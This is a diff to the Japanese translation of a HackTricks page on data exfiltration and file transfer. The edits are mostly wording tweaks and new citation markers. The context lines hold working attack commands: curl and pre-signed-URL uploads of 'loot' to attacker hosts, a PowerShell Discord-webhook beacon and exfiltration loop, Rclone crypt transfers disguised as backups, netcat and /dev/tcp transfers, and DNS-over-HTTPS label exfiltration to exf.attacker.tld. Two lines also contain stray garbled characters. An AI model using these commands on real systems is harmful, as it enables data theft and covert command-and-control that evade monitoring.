@@ -3,7 +3,7 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> `C:\Users\Public` に loot を staging し、正規のバックアップを模倣するために Rclone で exfiltrate する end-to-end の例については、以下の workflow を確認してください。
+> `C:\Users\Public` に loot を staging し、正規のバックアップを装って Rclone で exfiltrate する end-to-end の例については、以下の workflow を確認してください。
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
@@ -11,7 +11,7 @@
 
 ## 情報を exfiltrate するために一般的に whitelist されているドメイン
 
-悪用可能な、一般的に whitelist されているドメインを見つけるには、[https://lots-project.com/](https://lots-project.com/) を確認してください
+悪用可能な、一般的に whitelist されているドメインを確認するには、[https://lots-project.com/](https://lots-project.com/) を参照してください。
 
 ## Copy\&Paste Base64
 
@@ -52,7 +52,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### ファイルのアップロード
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**GET と POST（ヘッダーも含む）を出力する SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -66,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPSサーバー**
+### **HTTPS サーバー**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -109,7 +109,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ### HTTP/3 / QUIC
 
-egress controls が classic **TCP/443** の inspection 向けに調整されている一方、**UDP/443** に対しては permissive である場合、**HTTP/3** を強制することで、transfer を TLS-over-TCP ではなく **QUIC** に移行できます。attacker endpoint には native HTTP/3 support が必要です（例えば、すでに `Alt-Svc: h3` を広告している reverse proxy または upload endpoint）。
+egress controls が classic **TCP/443** の inspection 向けに調整されている一方、**UDP/443** には permissive な場合、**HTTP/3** を強制することで、転送を TLS-over-TCP ではなく **QUIC** に移行できます。攻撃者の endpoint には、native な HTTP/3 support（たとえば、すでに `Alt-Svc: h3` を広告している reverse proxy または upload endpoint）が必要です。
 ```bash
 # Strict: fail if QUIC/H3 is not available
 curl --http3-only -T loot.7z https://attacker-h3.example/upload
@@ -121,13 +121,13 @@ curl --http3 -T loot.7z https://attacker-h3.example/upload
 curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
 curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
 ```
-2025年のresearch paper（QUIC-Exfil）では、暗号化されたheadersやconnection migrationなどのQUIC featuresにより、firewallレベルでのexfiltration検知が、classic TLSやDNS-based channelsよりも困難になる可能性が示されました。そのため、HTTP/3のサポートが普及するにつれて、この領域の重要性は高まると考えられます。
+2025年の研究論文（QUIC-Exfil）では、暗号化されたヘッダーや接続移行などのQUICの機能により、古典的なTLSやDNSベースのチャネルよりも、ファイアウォールレベルでのexfiltrationの検知が困難になる可能性が示されました。そのため、HTTP/3のサポートが普及するにつれて、この領域の重要性はさらに高まると考えられます。<sup>[[9]](#references)</sup>
 
-### Pre-signed / delegated object-storage uploads
+### pre-signed / delegated object-storage uploads
 
-短期間有効な **signed URL** を発行または取得できる場合、victim側で必要なのは通常のHTTPS clientだけです。これにより、hostへのcloud SDKのインストールや長期間有効なcredentialsが不要になり、一般的なobject-storage trafficに紛れ込ませることができます。
+短期間だけ有効な **signed URL** を発行または取得できる場合、victim側で必要なのは通常のHTTPSクライアントだけです。これにより、ホストへのcloud SDKのインストールや長期間有効な認証情報が不要になり、一般的なobject-storageトラフィックに紛れ込ませることができます。
 
-**Linux / macOS（AWS S3 pre-signed `PUT`）**
+**Linux / macOS (AWS S3 pre-signed `PUT`)**
 ```bash
 curl -X PUT -T loot.7z \
 -H 'Content-Type: application/octet-stream' \
@@ -147,15 +147,15 @@ curl -X PUT --data-binary @loot.7z \
 'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
 ```
 Notes:
-- Pre-signed URLs / SAS tokens は通常、**path**、**HTTP method**、**expiration** のスコープを指定します。
+- Pre-signed URLs / SAS tokens は通常、**path**、**HTTP method**、**expiration** の範囲を指定します。
 - Azure Blob の `Put Blob` では、`x-ms-blob-type: BlockBlob` が必須です。
-- このパターンは、`curl`、`Invoke-WebRequest`、または raw HTTPS `PUT` を発行できる任意の custom implant で有効に機能します。
+- このパターンは、`curl`、`Invoke-WebRequest`、または raw HTTPS `PUT` を発行できる任意の custom implant で適切に機能します。<sup>[[8]](#references)</sup>
 
 ### goshs
 
 [goshs](https://github.com/patrickhener/goshs) は、upload、download、WebDAV、SFTP、SMB、TLS、authentication、share links、
-および OOB collaboration features（DNS、SMTP、NTLM hash capture）を備えた、
-`python3 -m http.server` の single-binary replacement です。
+および OOB collaboration features（DNS、SMTP、NTLM hash capture）を備えた
+`python3 -m http.server` の single-binary replacement です。<sup>[[4]](#references)</sup><sup>[[4]](#references)</sup>
 ```bash
 # Serve current directory on port 8000
 goshs
@@ -184,14 +184,14 @@ goshs -smtp -smtp-domain [REDACTED]
 # Tunnel via localhost.run (no port forwarding needed)
 goshs -tunnel
 ```
-## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+## C2 と Data Exfiltration のための Webhooks（Discord/Slack/Teams）
 
-Webhooks は、JSON とオプションのファイルパーツを受け付ける write-only の HTTPS endpoint です。信頼された SaaS ドメインへの通信として許可されていることが多く、OAuth/API keys が不要なため、低摩擦な beaconing と exfiltration に有用です。
+Webhooks は、JSON とオプションのファイルパーツを受け付ける write-only の HTTPS エンドポイントです。trusted SaaS domains へのアクセスは一般的に許可されており、OAuth/API keys も必要ないため、低摩擦な beaconing と exfiltration に利用できます。<sup>[[5]](#references)[[6]](#references)</sup>
 
 主なポイント:
 - Endpoint: Discord は https://discord.com/api/webhooks/<id>/<token> を使用します
-- `payload_json` という名前の part に `{"content":"..."}` を含め、オプションのファイル part(s) を `file` という名前で指定した `POST multipart/form-data`。
-- Operator loop のパターン: 定期的な beacon -> directory recon -> 対象ファイルの exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK により delivery を確認できます。
+- `payload_json` という名前のパートに `{"content":"..."}` を含め、オプションのファイルパートを `file` という名前で指定して POST multipart/form-data を送信します。
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK により delivery を確認できます。
 
 PowerShell PoC (Discord):
 ```powershell
@@ -261,21 +261,21 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-注:
-- 同様のパターンは、incoming webhooksを使用する他のコラボレーションプラットフォーム（Slack/Teams）にも適用できます。URLとJSON schemaはそれに応じて調整してください。
-- Discord Desktopのcache artifactsおよびwebhook/API recoveryのDFIRについては、以下を参照してください。
+Notes:
+- Similar patterns apply to other collaboration platforms (Slack/Teams) using their incoming webhooks; URL と JSON schema をそれぞれ適切に調整してください。
+- Discord Desktop の cache artifacts および webhook/API recovery の DFIR については、次を参照してください:<sup>[[7]](#references)</sup>
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
 {{#endref}}
 
-## Rclone（cloud/object-storage exfiltration）
+## Rclone (cloud/object-storage への exfiltration)
 
-Modern operatorsは、**lootをローカルにstage**してから[Rclone](https://rclone.org/)を使用し、transferを通常のbackupまたはsync jobに見せかけることがよくあります。実用的なパターンは次のとおりです。
+Modern operators は、**loot をローカルに staging** してから [Rclone](https://rclone.org/) を使用し、転送を通常の backup または sync job に見せかけることがよくあります。実用的なパターンは次のとおりです。
 
-1. 通常のremote（`s3`、`webdav`、`drive`、`mega`、...）
-2. **contentsとfilenamesをclient-sideで暗号化**する`crypt` wrapper
-3. providerがobject-size limitsを適用している場合、またはより小さいupload unitsが必要な場合のoptionalな`chunker` wrapper
+1. 通常の remote (`s3`、`webdav`、`drive`、`mega`、...)
+2. **contents と filenames を client-side で暗号化**する `crypt` wrapper
+3. provider が object-size limits を適用している場合、またはより小さな upload units を使用したい場合の optional な `chunker` wrapper
 ```bash
 # 1) Create the storage backend remote (interactive)
 rclone config              # ex: remote
@@ -292,10 +292,10 @@ rclone copy /loot secret:$(hostname)-$(date +%F) \
 # If you created the chunker wrapper, upload to overlay:... instead
 ```
 Notes:
-- `crypt` はファイルの内容と名前の両方を暗号化できます。
-- `chunker` は大きなファイルを透過的に分割し、ダウンロード時に再構成します。
-- `rclone.conf` は `crypt` の秘密情報を**難読化**された形式で保存しますが、保存時の強力な保護ではありません。短時間の操作では、専用の一時設定を使用し、処理後に削除することを推奨します。より長く保持する必要がある場合は、`rclone.conf` をそのままディスクに残すのではなく、暗号化された設定の処理（`RCLONE_CONFIG_PASS` / `--password-command`）を推奨します。
-- 対象がすでに **OneDrive**、**Google Drive**、または **Dropbox** を同期している場合は、同期ディレクトリに loot をコピーすることで、新しい転送バイナリを配置する代わりに、すでに承認済みのクライアントを利用できます。
+- `crypt` can encrypt both file contents and names.<sup>[[3]](#references)</sup>
+- `chunker` transparently splits large files and reassembles them on download.
+- `rclone.conf` は `crypt` の secrets を **obscured** 形式で保存するものであり、at-rest protection としては強力ではありません。短時間の operations では、専用の一時 config を使用し、終了後に削除することを推奨します。より長く保持する必要がある場合は、平文の `rclone.conf` をディスクに残すのではなく、encrypted config handling（`RCLONE_CONFIG_PASS` / `--password-command`）を使用してください。
+- 対象がすでに **OneDrive**、**Google Drive**、または **Dropbox** を sync している場合、loot を synchronized directory にコピーすることで、新しい transfer binary を配置せず、すでに承認済みの client を利用できます。
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
@@ -303,12 +303,12 @@ Notes:
 
 ## FTP
 
-### FTP サーバー (python)
+### FTP server (Python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP サーバー (NodeJS)
+### FTPサーバー (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -351,7 +351,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-または、**sambaを使用して** SMB share を作成します:
+または、**samba**を使用して smb share を作成します:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -375,7 +375,7 @@ WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.1
 WindPS-2> cd new_disk:
 ```
 ### goshs
-[goshs](https://github.com/patrickhener/goshs) は、ファイルを SMB 経由で提供し、接続するクライアントから NetNTLMv2 ハッシュを取得する、シングルバイナリの代替ツールです。
+[goshs](https://github.com/patrickhener/goshs) は、SMB 経由でファイルを提供し、接続するクライアントから NetNTLMv2 ハッシュを取得する単一バイナリの代替手段です<sup>[[4]](#references)</sup>：
 ```bash
 # Start SMB server with NTLM hash capture
 goshs -smb -smb-domain CORP
@@ -385,13 +385,13 @@ goshs
 ```
 ## SCP
 
-攻撃者は SSHd を稼働させておく必要があります。
+攻撃者は SSHd を実行している必要があります。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-被害者がSSHを利用できる場合、攻撃者は被害者のディレクトリを攻撃者側にmountできます。
+被害者に SSH がある場合、攻撃者は被害者のディレクトリを攻撃者側に mount できます。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -409,14 +409,14 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 被害者にファイルをUpload
+### 被害者にファイルをアップロードする
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-**@BinaryShadow\_** に感謝、】【
+**@BinaryShadow\_** に感謝
 
 ## **ICMP**
 ```bash
@@ -438,7 +438,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## DNS over HTTPS (DoH)
 
-classic UDP/53 DNS が noisy または blocked で、outbound HTTPS が広く許可されている場合、通常の DNS-label exfiltration pattern を public resolver への **DoH** requests 内に包むことができます。各 label は 63-byte DNS limit を十分下回る長さにし、Base32 のような DNS-safe alphabet を使用します。
+従来の UDP/53 DNS がノイジー、またはブロックされている一方で、外向きの HTTPS が広く許可されている場合、通常の DNS-label exfiltration pattern を public resolver への **DoH** requests に包むことができます。各 label は 63-byte の DNS 制限を大幅に下回る長さに保ち、Base32 のような DNS-safe alphabet を使用してください。
 ```bash
 # Encode -> split into DNS-safe labels -> send via DoH
 base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
@@ -449,52 +449,52 @@ curl --http2 -s \
 >/dev/null
 done
 ```
-`exf.attacker.tld` の authoritative DNS server で、クエリを数値プレフィックス順に並べ替え、Base32 stream を再構築します。これにより、従来の UDP/53 DNS ではなく、resolver への HTTPS 内で transport を行えます。
+`exf.attacker.tld` の authoritative DNS server 上で、クエリを numeric prefix の順に並べ替え、Base32 stream を再構成します。これにより、従来の UDP/53 DNS ではなく、resolver への HTTPS 内で transport を行えます。<sup>[[2]](#references)</sup>
 
-完全な双方向 DNS tunnel tooling（`iodine`、`dnscat2` など）については、[tunneling ページ](tunneling-and-port-forwarding.md)を確認してください。
+完全な双方向 DNS tunnel tooling（`iodine`、`dnscat2` など）については、[tunneling page](tunneling-and-port-forwarding.md) を確認してください。
 
 ## **SMTP**
 
-SMTP server にデータを送信できる場合、python を使ってデータを受信する SMTP を作成できます。
+SMTP server に data を送信できる場合は、python で data を受信する SMTP server を作成できます：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ### goshs
 
-[goshs](https://github.com/patrickhener/goshs) は、OOB exfiltration シナリオでメール callback を捕捉するための簡易 SMTP server を起動できます：
+[goshs](https://github.com/patrickhener/goshs) は、OOB exfiltration のシナリオでメールの callback を受け取るために、簡易 SMTP サーバーをすぐに起動できます<sup>[[4]](#references)</sup>】【。
 ```bash
 # Start SMTP callback server
 goshs -smtp -smtp-domain [REDACTED]
 ```
-受信したメールと callback は、ターミナル出力に直接表示されます。  
-完全な OOB coverage のために、DNS callback server と組み合わせることができます。
+受信したメールとcallbackはターミナル出力に直接表示されます。  
+完全なOOB coverageのためにDNS callback serverと組み合わせることができます:
 ```bash
 # DNS + SMTP combined
 goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 ## TFTP
 
-XP および 2003 ではデフォルトで有効（その他ではインストール時に明示的に追加する必要があります）
+XPおよび2003ではデフォルトで使用できます（その他ではインストール時に明示的に追加する必要があります）
 
-Kali では、**TFTP server を起動**します:
+Kaliで**TFTP serverを起動**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**PythonのTFTPサーバー:**
+**PythonでTFTPサーバー:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**victim**でKali serverに接続します:
+**victim**で、Kali serverに接続します：
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP のワンライナーでファイルをダウンロードします:
+PHP のワンライナーでファイルをダウンロードします：
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -536,24 +536,24 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` プログラムでは、バイナリを検査できるだけでなく、**hex からバイナリを再構築する機能**も利用できます。つまり、バイナリの hex を指定することで、`debug.exe` はバイナリファイルを生成できます。ただし、debug.exe には**最大 64 kb までのファイルしかアセンブルできないという制限**がある点に注意してください。
+`debug.exe` プログラムはバイナリを検査できるだけでなく、**hex からバイナリを再構築する機能**も備えています。つまり、バイナリの hex を指定することで、`debug.exe` はバイナリファイルを生成できます。ただし、debug.exe には**最大 64 kb サイズのファイルまでしかアセンブルできないという制限**がある点に注意してください。<sup>[[1]](#references)</sup>
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-その後、テキストを windows-shell にコピーアンドペーストすると、nc.exe というファイルが作成されます。
+その後、テキストを windows-shell にコピー＆ペーストすると、nc.exe というファイルが作成されます。
 
-## References
+## 参考資料
 
-- [Transferring files to Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-- [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
-- [Rclone `crypt` backend](https://rclone.org/crypt/)
-- [goshs](https://github.com/patrickhener/goshs)
-- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
-- [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
-- [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
-- [Uploading objects with presigned URLs - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
-- [QUIC-Exfil: Exploiting QUIC's Server Preferred Address Feature to Perform Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
+- [1] [Windows へのファイル転送](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+- [2] [Google Public DNS - DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
+- [3] [Rclone の `crypt` backend](https://rclone.org/crypt/)
+- [4] [goshs](https://github.com/patrickhener/goshs)
+- [5] [C2 としての Discord と、残されるキャッシュされた証拠](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [6] [Discord Webhooks - Webhook の実行](https://discord.com/developers/docs/resources/webhook#execute-webhook)
+- [7] [Discord Forensic Suite（cache parser）](https://github.com/jwdfir/discord_cache_parser)
+- [8] [presigned URLs を使用したオブジェクトのアップロード - Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
+- [9] [QUIC-Exfil: QUIC の Server Preferred Address Feature を悪用した Data Exfiltration Attacks](https://arxiv.org/abs/2505.05292)
 
 {{#include ../banners/hacktricks-training.md}}
